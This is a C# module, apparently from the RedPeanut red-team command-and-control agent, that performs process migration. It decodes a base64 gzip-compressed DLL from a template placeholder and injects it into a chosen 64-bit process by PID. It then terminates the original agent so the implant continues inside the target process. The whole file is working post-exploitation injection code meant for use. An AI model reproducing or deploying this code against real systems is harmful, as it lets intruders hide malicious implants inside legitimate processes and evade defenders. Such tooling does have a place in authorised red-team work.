using RedPeanutAgent.Execution;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.IO.Compression;
using System.Web.Script.Serialization;

class RedPeanutMigrate
{
    static private string nutclr = "#NUTCLR#";
    static private int pid = Int32.Parse("#PID#");

    public static void Execute(string[] args)
    {
        try
        {
            if (InjectionHelper.Is64bit(pid))
            {
                Console.WriteLine("[*] Migrating to process " + pid);

                bool result = InjectionHelper.OpenAndInject(pid, DecompressDLL(Convert.FromBase64String(nutclr)));

                if (result)
                {
                    throw new RedPeanutAgent.Core.Utility.EndOfLifeException();
                }
            }
            else
            {
                Console.WriteLine("[*] Process is not x64");
            }
        }
        catch (RedPeanutAgent.Core.Utility.EndOfLifeException)
        {
            throw new RedPeanutAgent.Core.Utility.EndOfLifeException();
        }
        catch (Exception e)
        {
            Console.WriteLine("[*] Error migrating process");
            Console.WriteLine("[*] Error migrating process " + e.Message);
            Console.WriteLine("[*] Error migrating process" + e.StackTrace);
        }
    }

    private static byte[] DecompressDLL(byte[] gzip)
    {
        using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
        {
            const int size = 4096;
            byte[] buffer = new byte[size];
            using (MemoryStream memory = new MemoryStream())
            {
                int count = 0;
                do
                {
                    count = stream.Read(buffer, 0, size);
                    if (count > 0)
                    {
                        memory.Write(buffer, 0, count);
                    }
                }
                while (count > 0);
                return memory.ToArray();
            }
        }
    }

    private static string GetPipeName(int pid)
    {
        string pipename = Dns.GetHostName();
        pipename += pid.ToString();
        return pipename;

    }
}

